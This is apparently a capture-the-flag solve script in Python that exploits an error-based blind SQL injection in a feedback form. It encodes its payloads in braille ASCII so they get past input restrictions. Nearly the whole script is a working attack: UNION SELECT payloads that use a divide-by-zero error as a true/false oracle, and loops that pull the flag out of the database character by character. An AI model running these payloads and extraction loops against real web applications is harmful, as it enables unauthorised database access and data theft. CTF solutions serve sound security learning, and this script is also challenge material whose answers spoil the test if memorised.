#!/usr/bin/python3

### SOLVE SCRIPT
import requests
import sys

# exploiting an error-based blind SQLi, but encoded in braille so sqlmap won't work

def text_to_braille(text):
    # Could just make a request to /api/braille.php each time, but to not DoS the server you can use this:
    # https://en.wikipedia.org/wiki/Braille_ASCII

    ASCII = " A1B'K2L@CIF/MSP\"E3H9O6R^DJG>NTQ,*5<-U8V.%[$+X!&;:4\\0Z7(_?W]#Y)="
    BRAILLE = "⠀⠁⠂⠃⠄⠅⠆⠇⠈⠉⠊⠋⠌⠍⠎⠏⠐⠑⠒⠓⠔⠕⠖⠗⠘⠙⠚⠛⠜⠝⠞⠟⠠⠡⠢⠣⠤⠥⠦⠧⠨⠩⠪⠫⠬⠭⠮⠯⠰⠱⠲⠳⠴⠵⠶⠷⠸⠹⠺⠻⠼⠽⠾⠿"

    braille = ""
    for t in text:
        index = ASCII.find(t)
        if index == -1:
            sys.exit("Not in braille ASCII")
        braille += BRAILLE[index]
    return braille

baseURL = "http://red.ufsit.club:8090"
if __name__ == "__main__":
    # Vulnerable location at /api/feedback.php in the `feedbackText` POST query
    # It returns errors with no error code, but if theres no error you see "Feedback successfully submitted!" which we can use for blind SQLi

    endpoint = "/api/feedback.php"

    # SQL statement probably looks something like "INSERT INTO feedback VALUES (1, 'INPUT_HERE')"
    # The character limit of braille ASCII makes things difficult, but we can still run SELECT queries like this:
    #       ') UNION SELECT NULL--
    # 
    # Doing some guessing you can find that the table FLAG exists with the query:
    #       ') UNION SELECT CONCAT('A', (SELECT CASE WHEN ((SELECT 'A' FROM FLAG LIMIT 1)='A') THEN 1/(SELECT 0) ELSE NULL END))--
    # Which gives a division by 0 error, whereas
    #       ') UNION SELECT CONCAT('A', (SELECT CASE WHEN ((SELECT 'A' FROM FLAG LIMIT 1)='B') THEN 1/(SELECT 0) ELSE NULL END))--
    # gives no error
    #
    # Similarly this query shows that there is a column named flag
    #       ') UNION SELECT CONCAT('A', (SELECT CASE WHEN ((SELECT LENGTH(FLAG) FROM FLAG LIMIT 1)>0) THEN 1/(SELECT 0) ELSE NULL END))--

    # Now we can get the length of the flag, since the charset is limited and we have to use substrings we can encode the flag to hex like:
    #       SELECT UPPER(ENCODE(CONVERT_TO(FLAG, 'UTF8'), 'HEX')) FROM FLAG
    # But there are other ways too, i.e just get the ASCII value of each char

    length = 0
    lengthQuery = "') UNION SELECT CONCAT('A', (SELECT CASE WHEN ((SELECT LENGTH(UPPER(ENCODE(CONVERT_TO(FLAG, 'UTF8'), 'HEX'))) FROM FLAG LIMIT 1)=%s) THEN 1/(SELECT 0) ELSE NULL END))--"
    while True:
        data = {"feedbackText" : text_to_braille(lengthQuery%length)}
        r = requests.post(baseURL + endpoint, data=data)
        if r.text == "Feedback successfully submitted!":
            # Not the right length, keep going
            length += 1
        else:
            break

    print(length)
    # Getting length = 72
    # Now we can get the flag using SUBSTRING

    hexFlag = ""
    hexCharset = "ABCDEF0123456789"

    flagQuery = "') UNION SELECT CONCAT('A', (SELECT CASE WHEN ((SELECT SUBSTRING(UPPER(ENCODE(CONVERT_TO(FLAG, 'UTF8'), 'HEX')), %s, 1) FROM FLAG LIMIT 1)='%s') THEN 1/(SELECT 0) ELSE NULL END))--"
    for i in range(1, length + 1):
        for x in hexCharset:
            data = {"feedbackText" : text_to_braille(flagQuery%(i, x))}
            r = requests.post(baseURL + endpoint, data=data)
            if r.text == "Feedback successfully submitted!":
                # Not the right char
                continue
            else:
                hexFlag += x
                print(hexFlag)
                break

    print(hexFlag)

    # Convert the output from hex to the flag and GG
